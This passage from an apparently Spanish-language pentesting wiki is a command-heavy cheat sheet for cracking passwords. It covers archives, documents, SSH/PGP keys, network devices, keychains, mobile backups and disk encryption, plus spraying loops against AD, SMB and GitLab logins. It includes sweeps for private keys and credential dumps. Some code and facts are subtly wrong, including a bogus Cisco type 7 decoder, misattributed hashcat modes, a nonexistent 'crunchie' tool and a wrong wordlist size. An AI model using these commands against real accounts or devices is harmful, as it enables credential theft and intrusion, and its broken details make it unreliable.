    unrar t -p"$pass" encrypted.rar 2>/dev/null && echo "Password: $pass" && break
done

# RAR password recovery avanzado
# Si conocés parte del password (ej: "password" + 3 dígitos):
# Usar mask attack
hashcat -m 12500 rar_hash.txt -a 3 password?d?d?d

# RAR multi-threaded cracking
hashcat -m 12500 rar_hash.txt -w 4 -O rockyou.txt
```

### 19.3 7-Zip Password Cracking

```bash
# Extraer hash de 7z
7z2john encrypted.7z > 7z_hash.txt
# O usando python:
python3 /opt/john/run/7z2john.py encrypted.7z > 7z_hash.txt

# Crackear con hashcat (modo 11600)
hashcat -m 11600 7z_hash.txt rockyou.txt

# Con 7z + script
for pass in $(cat rockyou.txt); do
    7z t -p"$pass" encrypted.7z 2>/dev/null && echo "Password: $pass" && break
done

# 7z con known-plaintext (más difícil que ZIP)
# Usar p7zip + john para ataques más complejos

# Ataque de diccionario con reglas
hashcat -m 11600 7z_hash.txt rockyou.txt -r rules/best64.rule

# Mask attack para 7z con formato conocido
hashcat -m 11600 7z_hash.txt -a 3 ?l?l?l?l?l?l?d?d?d
```

### 19.4 PDF Password Cracking

```bash
# Extraer hash de PDF
pdf2john encrypted.pdf > pdf_hash.txt
# O específicamente:
python3 /opt/john/run/pdf2john.pl encrypted.pdf > pdf_hash.txt

# Identificar versión de PDF
pdfinfo encrypted.pdf | grep -i encrypt

# Crackear con hashcat
# PDF 1.1-1.3 Acrobat 2-4 (hashcat 10400)
hashcat -m 10400 pdf_hash.txt rockyou.txt

# PDF 1.1-1.3 Acrobat 2-4 + coll (hashcat 10410)
hashcat -m 10410 pdf_hash.txt rockyou.txt

# PDF 1.4-1.6 Acrobat 5-8 (hashcat 10420)
hashcat -m 10420 pdf_hash.txt rockyou.txt

# PDF 1.7 Level 3 Acrobat 9 (hashcat 10500)
hashcat -m 10500 pdf_hash.txt rockyou.txt

# PDF 1.7 Level 8 Acrobat X-XI-XV (hashcat 10600/10700)
hashcat -m 10700 pdf_hash.txt rockyou.txt

# Owner password vs User password
# Los PDFs tienen dos contraseñas:
# - User password: para abrir el PDF
# - Owner password: para restricciones (imprimir, copiar)

# Quitar owner password (sin crackear)
# Si solo tiene owner password (no user password):
qpdf --decrypt encrypted.pdf decrypted.pdf
# O usar:
pdftk encrypted.pdf output decrypted.pdf

# Con herramientas de GUI
# PDFCrack (GUI, más lento)
pdfcrack -f encrypted.pdf -w rockyou.txt
```

### 19.5 Office Document Password Cracking

```bash
# Extraer hash de Office
# Office 97-2003 (.doc, .xls, .ppt)
office2john old_document.doc > office_hash.txt

# Office 2007+ (.docx, .xlsx, .pptx)
office2john document.docx > office_hash.txt

# Crackear con hashcat
# MS Office <= 2003 $0/$1 MD5+RC4 (hashcat 9700/9710)
hashcat -m 9700 office_hash.txt rockyou.txt

# MS Office <= 2003 $3 SHA1+RC4 (hashcat 9720)
hashcat -m 9720 office_hash.txt rockyou.txt

# Office 2007 (hashcat 9400)
hashcat -m 9400 office_hash.txt rockyou.txt

# Office 2010 (hashcat 9500)
hashcat -m 9500 office_hash.txt rockyou.txt

# Office 2013 (hashcat 9600)
hashcat -m 9600 office_hash.txt rockyou.txt

# Office 2016 SheetX (hashcat 19100-19400)
hashcat -m 19100 office_hash.txt rockyou.txt

# Con john
john office_hash.txt --wordlist=rockyou.txt
john office_hash.txt --wordlist=rockyou.txt --rules

# Específico para cada versión:
# Word 2007
hashcat -m 9800 word_hash.txt rockyou.txt
# Excel 2010
hashcat -m 9810 excel_hash.txt rockyou.txt
# PowerPoint 2013
hashcat -m 9820 ppt_hash.txt rockyou.txt

# Office 365 (cifrado moderno)
# Usar john con el formato OfficeOpenXML
john --format=OfficeOpenXML --wordlist=rockyou.txt office_hash.txt
```

### 19.6 PGP Private Key Passphrase Cracking

```bash
# Extraer hash de clave privada PGP
gpg2john private.key > pgp_hash.txt

# Crackear con john
john pgp_hash.txt --wordlist=rockyou.txt
john pgp_hash.txt --wordlist=rockyou.txt --rules

# Crackear con hashcat
# PGP (hashcat 26200 - OpenPGP)
hashcat -m 26200 pgp_hash.txt rockyou.txt

# Extraer clave privada del keyring
gpg --export-secret-keys -a > private.key
# Si está protegida por passphrase, crackear

# Buscar claves privadas PGP en el sistema
find / -name "*.gpg" -o -name "*.pgp" -o -name "secring.gpg" 2>/dev/null
find /home -name "*.asc" -exec grep -l "BEGIN PGP PRIVATE KEY" {} \;
```

### 19.7 SSH Key Passphrase Cracking

```bash
# Extraer hash de clave SSH
ssh2john.py id_rsa > ssh_hash.txt
# O usando john:
python3 /opt/john/run/ssh2john.py id_rsa > ssh_hash.txt

# Crackear con john
john ssh_hash.txt --wordlist=rockyou.txt
john ssh_hash.txt --wordlist=rockyou.txt --rules

# Con hashcat no hay modo nativo para SSH keys
# Usar john o script custom

# Para claves SSH en formato PUTTY (.ppk)
putty2john key.ppk > putty_hash.txt
john putty_hash.txt --wordlist=rockyou.txt

# Extraer hashes de SSH keys en lote
for keyfile in $(find /home -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519"); do
    python3 /opt/john/run/ssh2john.py "$keyfile" >> all_ssh_hashes.txt
done

# Buscar SSH keys en el sistema
find / -name "id_rsa*" -o -name "*.pem" 2>/dev/null | grep -v ".pub"
```

---

## 20. Password [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) de Dispositivos de [red](../raw/r3d3s-f0nd4m3nt0s.md)

### 20.1 Cisco Password Cracking

```bash
# Tipos de hash Cisco:
# Cisco PIX (hashcat 2400)
hashcat -m 2400 cisco_pix.txt rockyou.txt

# Cisco ASA (hashcat 2410)
hashcat -m 2410 cisco_asa.txt rockyou.txt

# Cisco IOS $8$ (hashcat 9200)
hashcat -m 9200 cisco_ios8.txt rockyou.txt

# Cisco IOS $9$ (hashcat 9300)
hashcat -m 9300 cisco_ios9.txt rockyou.txt

# Cisco enable password (tipo 4/5/7)
# Tipo 7 (débil, reversible)
# Usar herramienta cisco_decrypt.py:
python3 cisco_decrypt.py "0822455D0A16"

# Tipo 5 (salt MD5)
# Extraer del config:
enable secret 5 $1$salt$hash
hashcat -m 500 cisco_type5.txt rockyou.txt

# Tipo 8/9 (PBKDF2-SHA256/SCRYPT)
hashcat -m 9200 cisco_type8.txt rockyou.txt  # $8$
hashcat -m 9300 cisco_type9.txt rockyou.txt  # $9$

# Decrypt password tipo 7 (más común en configs)
# Las passwords tipo 7 usan Vigenere cipher
# Herramienta: cisco_password_cracker.py
python3 -c "
import re
pw_codes = ['dsu','fd','dx','du','fc','dq','fw','ev','ev','ez','dy','e','fa','fp','fy','ga','gb','fz','gc','ge','gd','gf','gg','gh','gi','gj','gk','gl','gm','gn','go','gp','gq','gr','gs','gt','gu','gv','gw','gx','gy','gz','ha','hb','hc','hd','he','hf','hg','hh','hi','hj','hk','hl','hm','hn','ho','hp','hq','hr','hs','ht','hu','hv','hw','hx','hy','hz','ia','ib','ic','id','ie','if','ig','ih','ii','ij','ik','il','im','in','io','ip','iq','ir','is','it','iu','iv','iw','ix','iy','iz']
def decode_type7(enc):
    enc = enc.strip()
    if enc[0].isdigit():
        offset = int(enc[0])
        enc = enc[1:]
    else:
        offset = 0
    result = ''
    for i, c in enumerate(zip(enc[::2], enc[1::2])):
        char_val = int(''.join(c), 16)
        result += chr(char_val ^ ord(pw_codes[(offset + i) % 53][0]))
    return result
print(decode_type7('0822455D0A16'))
"
```

### 20.2 Juniper Password Cracking

```bash
# Juniper $9$ hash (similar a Cisco)
hashcat -m 9300 juniper_hash.txt rockyou.txt

# Juniper (older) tipo 1 (plaintext en config)
# Buscar en configs:
cat juniper.conf | grep "plain-text-password"

# Juniper tipo 4 (MD5-based)
# Extraer hash y crackear con MD5
hashcat -m 500 juniper_type4.txt rockyou.txt

# Extraer configs de Juniper via SNMP
snmpwalk -v2c -c public 192.168.1.100
snmpget -v2c -c public 192.168.1.100 .1.3.6.1.4.1.2636.3.40.1.5.1.5.1.0
```

### 20.3 Network Device Password Cracking

```bash
# Huawei
# Formato: $1$salt$hash (MD5 crypt)
hashcat -m 500 huawei_hash.txt rockyou.txt

# TP-Link, D-Link, Netgear
# Suelen usar MD5 (hashcat 0)
hashcat -m 0 router_hash.txt rockyou.txt

# Ubiquiti (EdgeOS, UniFi)
# EdgeOS usa SHA-512:
hashcat -m 1800 ubiquiti_hash.txt rockyou.txt
# UniFi controller usa bcrypt:
hashcat -m 3200 unifi_hash.txt rockyou.txt

# Palo Alto
# Usa MD5 crypt:
hashcat -m 500 paloalto_hash.txt rockyou.txt

# Fortinet / FortiGate
# Tipo de hash: SHA256 (modo 7000 FortiGate)
hashcat -m 7000 fortigate_hash.txt rockyou.txt

# Arista
# SHA512 crypt:
hashcat -m 1800 arista_hash.txt rockyou.txt

# Brocade
# MD5 crypt:
hashcat -m 500 brocade_hash.txt rockyou.txt
```

---

## 21. macOS Keychain & [ios](../raw/10s-p3nt3st1ng.md) Backup [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas)

### 21.1 macOS Keychain Cracking

```bash
# El keychain de macOS guarda contraseñas de: WiFi, websites, apps, etc.

# Extraer keychain
# El keychain principal está en:
ls ~/Library/Keychains/login.keychain-db

# Extraer con security command
security dump-keychain login.keychain-db > keychain_dump.txt
security dump-keychain -d login.keychain-db 2>&1 | grep -A 5 "acct" 

# Extraer hash para crackear
python3 /opt/john/run/keychain2john.py login.keychain-db > keychain_hash.txt

# Crackear con john
john keychain_hash.txt --wordlist=rockyou.txt

# Crackear con hashcat
# macOS keychain (hashcat 23200)
hashcat -m 23200 keychain_hash.txt rockyou.txt

# Extraer passwords de WiFi (needs root)
security find-generic-password -wa "WiFi Network Name"

# Extraer todas las contraseñas guardadas
security dump-keychain -a -d login.keychain-db | grep -A 2 "password"
```

### 21.2 iOS Backup Password Cracking

```bash
# Los backups de iOS pueden estar cifrados con contraseña
# El backup está en:
# Windows: %APPDATA%\Apple Computer\MobileSync\Backup\
# macOS: ~/Library/Application Support/MobileSync/Backup/

# Extraer hash del backup
python3 /opt/john/run/itunes_backup2john.py manifest.plist > ios_hash.txt
# O usar:
python3 iTunesBackupHashExtractor.py -i manifest.plist -o ios_hash.txt

# Crackear con hashcat
# iTunes Backup >= 10.0 (hashcat 14700)
hashcat -m 14700 ios_hash.txt rockyou.txt

# iTunes Backup < 10.0 (hashcat 14800)
hashcat -m 14800 ios_hash.txt rockyou.txt

# Con john
john ios_hash.txt --wordlist=rockyou.txt
john ios_hash.txt --wordlist=rockyou.txt --rules

# Después de crackear, extraer datos del backup
# Usar iBackupBot o iPhoneBackupExtractor
# O manualmente con python:
python3 -c "
import plistlib
with open('manifest.plist', 'rb') as f:
    pl = plistlib.load(f)
    print('Cifrado:', pl.get('IsEncrypted'))
    print('Version:', pl.get('ProductVersion'))
    print('IMEI:', pl.get('IMEI'))
"
```

### 21.3 [android](../raw/4db-d33p-d1v3.md) FBE (File-Based Encryption) Cracking

```bash
# Android FBE cifra archivos por usuario
# Los PIN/pattern/password protegen la clave de cifrado

# Extraer gatekeeper password hash
# El hash está en:
# /data/system/gatekeeper.password.key (para password)
# /data/system/gatekeeper.pattern.key (para pattern)
# /data/system/gatekeeper.gesture.key (para gesture)

# Extraer hash con ADB (rooted device)
adb shell
su
strings /data/system/gatekeeper.password.key > hash.bin

# Convertir hash para hashcat
python3 gatekeeper2hashcat.py hash.bin > android_hash.txt

# Crackear con hashcat (modo 26500 - iPhone Passcode / Android PIN)
hashcat -m 26500 android_hash.txt rockyou.txt

# Android pattern cracking
# Los patterns de 3x3 tienen 389,112 combinaciones posibles
# Fuerza bruta directa
python3 android_pattern_crack.py
# Los patrones se representan como hash SHA1
# Crackear con john o hashcat

# Android backup password cracking
# Los backups .ab (Android Backup) pueden tener password
# Extraer con:
python3 /opt/john/run/androidbackup2john.py backup.ab > android_hash.txt
john android_hash.txt --wordlist=rockyou.txt
```

---

## 22. Windows Hello PIN & BitLocker Recovery Key [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas)

### 22.1 Windows Hello PIN Cracking

```bash
# Windows Hello PIN está almacenado en TPM
# Solo accesible si tenés privilegios SYSTEM + acceso al TPM

# Extraer hash de PIN desde el TPM
# Usar herramientas de Microsoft:
# Tpmvscmgr.exe (virtual smartcard manager)

# El PIN está protegido por:
# - TPM (Hardware)
# - Virtual Smart Card (VSC)
# - El hash del PIN está en NGC (Next Generation Credential)

# Extraer NGC key
# Directorio:
dir C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc

# Usar herramienta especializada
ngcrack.exe --pin-hashes ngc_hashes.txt

# Crackear PIN (4-8 dígitos) por fuerza bruta
hashcat -m 26500 ngc_hash.txt -a 3 ?d?d?d?d  # 4 digit PIN
hashcat -m 26500 ngc_hash.txt -a 3 ?d?d?d?d?d?d  # 6 digit PIN

# Con John
john ngc_hash.txt --incremental=digits
```

### 22.2 BitLocker Recovery Key Cracking

```bash
# BitLocker recovery key es un número de 48 dígitos
# Formato: xxxxxx-xxxxxx-xxxxxx-xxxxxx-xxxxxx-xxxxxx-xxxxxx-xxxxxx

# Extraer hash de BitLocker desde disco bloqueado
bitlocker2john /dev/sda2 > bitlocker_hash.txt

# O desde imagen forense:
bitlocker2john image.dd > bitlocker_hash.txt

# Crackear con hashcat (modo 22100)
hashcat -m 22100 bitlocker_hash.txt rockyou.txt

# Crackear recovery key (48 dígitos)
# Fuerza bruta de recovery key (8 grupos × 6 dígitos)
hashcat -m 22100 bitlocker_hash.txt -a 3 ?d?d?d?d?d?d-?d?d?d?d?d?d-?d?d?d?d?d?d

# Con recovery key conocida parcial
# Si conocés algunos grupos:
hashcat -m 22100 bitlocker_hash.txt -a 3 123456-234567-?d?d?d?d?d?d-?d?d?d?d?d?d

# Extraer recovery key de AD (si el bitlocker está gestionado)
# En Active Directory:
# Buscar en atributo: msFVE-RecoveryInformation
# Usar ADSI:
powershell "Get-ADObject -Filter {objectClass -eq 'msFVE-RecoveryInformation'} -Properties *"

# Extraer recovery key de Microsoft Account
# Si el usuario subió su recovery key a su cuenta Microsoft:
# https://account.microsoft.com/devices/recoverykey
```

### 22.3 LUKS Password Cracking (Linux)

```bash
# LUKS (Linux Unified Key Setup) cifra discos completos

# Extraer hash de LUKS
luks2john /dev/sda2 > luks_hash.txt

# Crackear con john
john luks_hash.txt --wordlist=rockyou.txt

# Crackear con hashcat (no tiene modo nativo, usar john)

# Fuerza bruta de LUKS passphrase
# Si conocés el formato (ej: 8 letras minúsculas):
# Usar crunchie + john
crunchie 8 8 abcdefghijklmnopqrstuvwxyz -o temp.txt
john --stdin luks_hash.txt < temp.txt

# LUKS con múltiples slots de passphrase
cryptsetup luksDump /dev/sda2
# Muestra los slots activos (0-7)

// Ataque de diccionario a LUKS
for pass in $(cat rockyou.txt); do
    echo -n "$pass" | cryptsetup luksOpen --test-passphrase /dev/sda2 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "CONTRASENIA ENCONTRADA: $pass"
        break
    fi
done
```

### 22.4 FileVault Password Cracking (macOS)

```bash
# FileVault es el cifrado de disco completo de macOS

# Extraer hash de FileVault
python3 /opt/john/run/filevault2john.py /dev/disk1s2 > filevault_hash.txt

# Crackear con hashcat (modo 23200 para macOS v10.15+)
hashcat -m 23200 filevault_hash.txt rockyou.txt

# Fuerza bruta de FileVault password
# Si conocés formato del password:
hashcat -m 23200 filevault_hash.txt -a 3 ?u?l?l?l?l?l?d?d?d

# Extraer recovery key de iCloud
# Si el usuario guardó su recovery key en iCloud:
# https://iforgot.apple.com/password/verify/appleid

# Con FileVault mounted, extraer contraseñas del keychain
security -i
security dump-keychain -a login.keychain-db
```

---

## 23. Hardware Acceleration y Distributed [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas)

### 23.1 FPGA para Password Cracking

```bash
# FPGA (Field-Programmable Gate Array) puede acelerar algoritmos específicos
# Intel Stratix 10, Xilinx Alveo U250

# bcrypt en FPGA: ~1000x más rápido que CPU
# Hashcat no soporta FPGA nativamente, pero hay implementaciones custom

# Proyecto open source: bcrypt-fpga
git clone https://github.com/katexochen/bcrypt-fpga
cd bcrypt-fpga
# Requiere: Vivado/Vitis, board Xilinx Alveo
make
./bcrypt_fpga --hashes bcrypt.txt --wordlist rockyou.txt

# Comparativa de rendimiento bcrypt (cost=10):
# CPU (AMD Ryzen 9): ~20 kH/s
# GPU (RTX 4090): ~200 kH/s
# FPGA (Alveo U250): ~20,000 kH/s (20 MH/s)
```

### 23.2 ASIC para Password Cracking

```bash
# ASIC son chips diseñados específicamente para un algoritmo
# Ejemplo: Bitcoin ASIC para SHA-256
# No hay ASICs comerciales para password cracking general

# Pero se pueden usar Bitcoin ASICs (Antminer, Whatsminer) para:
# - SHA-256 (hashcat 1400)
# No funcionan para:
# - MD5, NTLM, bcrypt, etc.

# Usar Antminer S19 para SHA-256 cracking
# Necesitás firmware custom: Braiins OS+ o Vnish
# Ejemplo de setup:
# 1. Instalar Braiins OS+ en el ASIC
# 2. Conectar a pool local (ckpool)
# 3. Enviar hashes como trabajo

# No es práctico para password cracking general
# Solo útil si tenés muchos hashes SHA-256
```

### 23.3 GPU Overclocking para Cracking

```bash
# Overclock de GPU para máximo rendimiento en cracking

# NVIDIA - usar nvidia-smi + nvidia-settings
# Aumentar power limit al máximo
nvidia-smi -pl 450  # Watts máximo (depende de la GPU)

# Overclock de memoria (más importante que core para hashcat)
nvidia-settings -a "[gpu:0]/GPUMemoryTransferRateOffsetAllPerformanceLevels=1500"
nvidia-settings -a "[gpu:0]/GPUGraphicsClockOffsetAllPerformanceLevels=100"

# Underclock del core (ahorra energía, mínimo impacto en rendimiento)
nvidia-settings -a "[gpu:0]/GPUGraphicsClockOffsetAllPerformanceLevels=-200"

# AMD - usar rocm-smi o amdgpu
rocm-smi --setpoweroverdrive 300
rocm-smi --setclock 0:2500  # Memory clock
rocm-smi --setclock 1:2000  # Core clock

# Monitorear temperatura (crítico!)
nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used,power.draw --format=csv -l 5

# Undervolt para mantener temperatura
# Crear curva VF en MSI Afterburner (Windows)
# O en Linux con nvidia-smi + coolbits

# No pasar de 80°C en equilibrio
# Ideal: 65-75°C para máxima vida útil
```

### 23.4 Distributed Cracking con Hashtopolis (Advanced Setup)

```bash
# Hashtopolis advanced: chunking de wordlists grandes

# Partir wordlists en pedazos para distribución
# Ejemplo: rockyou.txt de 14GB partido en 100 chunks de ~140MB
cd /opt/wordlists
split -n l/100 rockyou.txt chunk_

# En Hashtopolis, crear tarea con:
# - Chunk size: 1 (min chunk)
# - Force pipe: false
# Cada agente recibe chunks diferentes y trabaja en paralelo

# Distribución de hashes por agente
# Si tenés 10M hashes, partilos:
split -n l/10 ntlm_hashes.txt hash_chunk_

# Cada agente recibe su chunk de hashes
# Cuando terminan, resultados se combinan automáticamente

# Benchmarks por tipo de agente
# Hashtopolis mide rendimiento de cada agente
# y distribuye trabajo proporcionalmente

# Script de deploy automático con Ansible
cat > deploy_cracking_nodes.yml << EOF
---
- hosts: cracking_nodes
  tasks:
    - name: Install hashcat
      apt: name=hashcat state=latest
    - name: Install hashtopolis agent
      get_url: url=http://server/hashtopolis-agent dest=/opt/hashtopolis-agent mode=0755
    - name: Configure agent
      template: src=agent.json.j2 dest=/opt/agent.json
    - name: Start agent
      systemd: name=hashtopolis-agent state=started enabled=yes
EOF
```

---

## 24. Password Spraying a Escala con Custom Tools

### 24.1 Domain Password Spraying Automatizado

```bash
# Spraying contra Active Directory via LDAP
# Usando ldapsearch para validar credenciales

for user in $(cat users.txt); do
    ldapsearch -x -H ldap://192.168.1.100 -D "DOMINIO\\$user" -w "Spring2024!" -b "dc=dominio,dc=com" -s base 2>&1 | grep -q "Success"
    if [ $? -eq 0 ]; then
        echo "[+] CREDENCIALES VALIDAS: $user:Spring2024!"
    fi
done

# Spraying via SMB con crackmapexec (el más rápido)
for password in $(cat passwords.txt); do
    crackmapexec smb 192.168.1.100 -u users.txt -p "$password" --continue-on-success
    echo "Waiting 30 seconds..."
    sleep 30
done

# Spraying con kerbrute (Kerberos, más sigiloso que SMB)
kerbrute passwordspray -d dominio.com --dc 192.168.1.100 users.txt "Spring2024!" -o valid.txt

# Spraying contra Exchange Web Services (EWS)
# Usando EWS Spray
python3 ewsSpray.py -u users.txt -p "Spring2024!" -d dominio.com -e https://mail.dominio.com/ews
```

### 24.2 Password Spraying contra APIs

```bash
# Spraying contra REST APIs
# Ejemplo: GraphQL, REST, SOAP

python3 custom_sprayer.py --target "https://api.empresa.com/login" \
  --users users.txt --passwords passwords.txt \
  --method POST \
  --data '{"username":"__USER__","password":"__PASS__"}' \
  --success "access_token" \
  --delay 30

# Spraying contra Jira, Confluence, GitLab, etc.
# Cada plataforma tiene su endpoint de login

# Jira
python3 jira_spray.py -u users.txt -p passwords.txt -t https://jira.empresa.com
# Confluence
python3 confluence_spray.py -u users.txt -p passwords.txt -t https://wiki.empresa.com
# GitLab
for pass in $(cat passwords.txt); do
    for user in $(cat users.txt); do
        curl -s -X POST -d "user[login]=$user&user[password]=$pass" \
          "https://gitlab.empresa.com/users/sign_in" | grep -q "Signed in" && \
          echo "VALID: $user:$pass"
        sleep 5
    done
done
```

---

## 25. Password [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) Defense Analysis

### 25.1 Cómo Analizar la Fortaleza de tus Propias Contraseñas

```bash
# Verificar si una contraseña es crackeable rápidamente
# Usar hashcat para medir tiempo de cracking

# 1. Generar hash de tu contraseña
echo -n "MiPasswordSegura123!" | md5sum
echo -n "MiPasswordSegura123!" | sha256sum

# 2. Benchmark de tiempo estimado
# NTLM: ~300 GH/s en RTX 4090
# Si tu password tiene 8 chars con mayúscula, minúscula, dígito = ~200 TH/s posibilidades
# Tiempo: 200TH / 300GH ≈ 666 segundos ≈ 11 minutos

# 3. bcrypt benchmark: ~200 kH/s en RTX 4090
# Con costo 12:
hashcat -b -m 3200
# Si tu password bcrypt tiene 12 chars aleatorios: millones de años

# 4. Usar HaveIBeenPwned API
# Verificar si tu password está en filtraciones
curl -s "https://api.pwnedpasswords.com/range/$(echo -n 'password123' | sha1sum | cut -d' ' -f1 | head -c 5)" | grep -i "$(echo -n 'password123' | sha1sum | cut -d' ' -f1 | tail -c 36 | tr 'a-f' 'A-F')"
```

### 25.2 Password Strength Estimator para Auditorías

```bash
# Script para estimar fortaleza de passwords en lote
# Útil para auditorías internas

python3 << 'EOF'
import hashlib
import math
import sys

charsets = {
    'lower': 26,
    'upper': 26,
    'digit': 10,
    'special': 32,
    'all': 94
}

def estimate_strength(password):
    length = len(password)
    charset_size = 0
    if any(c.islower() for c in password): charset_size += 26
    if any(c.isupper() for c in password): charset_size += 26
    if any(c.isdigit() for c in password): charset_size += 10
    if any(not c.isalnum() for c in password): charset_size += 32

    entropy = length * math.log2(charset_size) if charset_size > 0 else 0

    # Tiempo estimado a 300 GH/s (NTLM en RTX 4090)
    combinations = charset_size ** length
    time_seconds = combinations / 300e9  # NTLM speed

    if entropy < 28:
        rating = "MUY DEBIL - se crackea en segundos"
    elif entropy < 36:
        rating = "DEBIL - se crackea en minutos"
    elif entropy < 60:
        rating = "MEDIO - días a meses"
    elif entropy < 80:
        rating = "FUERTE - años"
    else:
        rating = "MUY FUERTE - décadas/siglos"

    return entropy, rating, time_seconds

if __name__ == '__main__':
    if len(sys.argv) > 1:
        password = sys.argv[1]
    else:
        password = input("Password a analizar: ")

    entropy, rating, time_s = estimate_strength(password)
    print(f"Password: {password}")
    print(f"Largo: {len(password)}")
    print(f"Entropy: {entropy:.1f} bits")
    print(f"Rating: {rating}")
    print(f"Tiempo estimado (NTLM RTX 4090): {time_s:.2e} segundos")
EOF
```

---

## 26. Referencias y Recursos Adicionales

- **[hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat)**: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://[hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat).net/[hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat)/
- **Hashcat wiki**: https://hashcat.net/wiki/
- **[john the ripper](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper)**: https://www.openwall.[com](../raw/w1n-s9bsyst3ms.md#com)/[john](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper)/
- **Probable Wordlists**: https://github.com/berzerk0/Probable-Wordlists
- **SecLists**: https://github.com/danielmiessler/SecLists
- **Weakpass**: https://weakpass.com/
- **CrackStation**: https://crackstation.net/
- **Hashtopolis**: https://github.com/s3inlc/hashtopolis
- **Hashes.com**: https://hashes.com (base de datos de hashes)
- **CMD5**: https://cmd5.com (reverse MD5 lookup)
- **Hashes.org**: https://hashes.org (comunidad de [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas))
- **GPU/ASIC Cracking**: https://gist.github.com/epixoip/a83d38dd0baa08fe6354
- **[nist](../raw/p3nt3st-m3th0d0l0gy.md#nist) SP 800-63B**: https://pages.[nist](../raw/p3nt3st-m3th0d0l0gy.md#nist).gov/800-63-3/sp800-63b.html (password guidelines)
- **Have I Been Pwned**: https://haveibeenpwned.com (check passwords)
- **TruffleHog**: https://github.com/trufflesecurity/trufflehog (secret scanning)
- **Gitleaks**: https://github.com/gitleaks/gitleaks (repo scanning)
- **[bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound)**: https://github.com/BloodHoundAD/[bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound) ([ad](../raw/w1nd0ws-d0m41n-4dm1n.md) attack paths)
- **Impacket**: https://github.com/fortra/impacket
- **CrackMapExec**: https://github.com/Porchetta-Industries/CrackMapExec
- **NetNTLM Crack Station**: https://ntlm.pw/


